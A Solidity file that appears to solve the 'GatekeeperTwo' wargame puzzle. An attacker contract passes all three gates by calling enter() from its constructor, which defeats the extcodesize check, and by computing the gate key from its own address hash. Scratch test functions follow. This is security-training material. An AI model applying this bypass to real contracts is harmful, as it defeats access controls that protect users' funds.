// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin, "Gate one");
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0, "Gate two");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1, "Gate three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperTwoAttacker {
    constructor(address payable _adrr) public {
        GatekeeperTwo gate = GatekeeperTwo(_adrr);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));
        gate.enter(key);
    }
}

contract Test {
    function test1() public view returns (uint64){
       return uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));
    }

    function test2(bytes8 _gateKey) public view returns (uint64){
       return uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey);
    }
    
     function test3() public pure returns (uint64){
       return uint64(0) - 1;
    }
    
    function test4() public view returns (bytes8){
       return bytes8(keccak256(abi.encodePacked(msg.sender)));
    }
    
    function test5(bytes8 _gateKey) public pure returns (uint64){
       return uint64(_gateKey);
    }
}